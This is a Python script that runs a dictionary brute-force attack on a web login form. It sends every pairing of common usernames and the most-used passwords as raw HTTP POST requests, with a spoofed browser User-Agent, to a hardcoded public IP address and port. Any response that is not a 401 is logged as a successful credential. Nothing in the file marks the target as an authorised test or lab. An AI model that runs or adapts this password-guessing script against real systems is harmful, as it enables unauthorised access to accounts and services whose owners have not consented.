# Import required Python libraries
import socket
import time
import logging
from urllib.parse import quote

# Configure the logging settings: appending to 'app.log', with specific log format and level
logging.basicConfig(filename='app.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

# Initialize a global request counter to 0. This counts the number of requests sent.
request_counter = 0

# Check if string is null or whitespace
def is_null_or_whitespace(s):
    return s is None or s.strip() == ""

# Define a function to read data from a text file and return it as a list.
def read_data_from_file(filename):
    try:
        # Initialize an empty list to store lines from the file.
        data_list = []
        
        # Open the file in read-only mode.
        with open(filename, "r") as file:
            # Loop through each line in the file.
            for line in file:
                # Remove leading and trailing white spaces, including newline characters.
                line = line.strip()
                
                # Append the sanitized line to the list.
                data_list.append(line)
        
        # Return the list populated with lines from the file.
        return data_list
    
    except Exception as e:  # Catch any exceptions that may occur.
        # Log the exception to the console.
        print(f"An error occurred while reading the file: {e}")
        
        # Return an empty list as no data could be read.
        return []

# Define a function to send a POST request.
def send_post_request(host, path, port, username, password):
    global request_counter  # Declare the global variable for tracking the number of requests.
    
    try:
        # Check if 10,000 requests have been made. If so, exit.
        if request_counter >= 10000:
           print("Reached the limit of 10,000 requests. Exiting.")
           return False
            
        # Initialize a new socket object for IPv4 and TCP
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a 10-second timeout for the socket operations.
        client.settimeout(60)
        
        # Connect the socket to the given host and port.
        client.connect((host, port))
        
        # Create the request line for the HTTP POST request.
        request_line = f"POST {quote(path)} HTTP/1.1\r\n"
        
        # Create the HTTP headers required for the POST request.
        headers = f"Host: {host}\r\n"
        headers += "Content-Type: application/x-www-form-urlencoded\r\n"
        headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        headers += f"Referer: http://{host}:{port}{path}\r\n"
        headers += "Accept-Encoding: gzip, deflate\r\n"
        headers += "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\n"
        headers += "Cache-Control: max-age=0\r\n"
        headers += "Upgrade-Insecure-Requests: 1\r\n"
        headers += f"Origin: http://{host}:{port}\r\n"
        headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\r\n"

        
        # Construct the payload with the username and password.
        payload = f"username={quote(username)}&password={quote(password)}\r\n"
        
        # Calculate the content length for the HTTP header.
        content_length = f"Content-Length: {len(payload)}\r\n\r\n"
        
        # Assemble the complete HTTP POST request.
        request = request_line + headers + content_length + payload
        
        # Send the POST request over the socket.
        print(request)
        client.send(request.encode())
        
        # Initialize an empty list to collect the response chunks.
        response_chunks = []
        
        # Loop to read the incoming response data in chunks.
        while True:
            chunk = client.recv(2048)  # Read up to 2048 bytes.
            if chunk:  # If a chunk is received, append it to the list.
                response_chunks.append(chunk)
            else:  # If no more data, break the loop.
                break
                
        # Close the socket connection.
        client.close()
        
        # Concatenate and decode the response chunks into a single string.
        response = b"".join(response_chunks).decode("utf-8")
        
        if (is_null_or_whitespace(response)):
            print(f"\033[91mUNKNOWN - User: {username} - Password: {password}\033[0m")

        else:
            # Extract the first line of the HTTP response (status line).
            status_line = response.split("\r\n")[0]
            
            # Extract the HTTP status code from the status line.
            status_code = int(status_line.split(" ")[1]) 
            
            # Log success if the status code is not 401 (Unauthorized).
            if status_code != 401:
                logging.info(f"SUCCEED => User: {username} - Password: {password}")
            else:
                print(f"\033[91m{status_line} - User: {username} - Password: {password}\033[0m\n\n")

        # Increment the global request counter.
        request_counter += 1
        
        # Return True to indicate successful execution.
        return True
    
    # Handle cases where the socket operation times out.
    except socket.timeout:
        print("\033[91mSocket timed out\033[0m")
        return True
    
    # Handle all other exceptions.
    except Exception as e:
        print(f"\033[91mAn error occurred: {e}\033[0m")
        return True

# Entry point of the script.
if __name__ == '__main__':
    # Read lines from the file into a list.
    user_list = read_data_from_file("./data/users/top-users-shortlist.txt")
    password_list = read_data_from_file("./data/passwords/2020-200-most-used-passwords.txt")
    
    # Check if data was successfully read.
    if user_list and password_list:
        print("Starting...\n")
        
        # Loop through each username in the list.
        for username in user_list:
            
            # Loop through each password in the list.
            for password in password_list:
                
                # Send POST request with each username-password pair.
                if not send_post_request("54.206.178.157", "/classified.html", 8084, username, password):
                    exit(0)

                # Pause the execution for 1 second between requests.
                time.sleep(1)
                
    else:
        # Log an error message if no data could be read from the file.
        print("\033[91mCould not read data from file. Exiting.\033[0m")
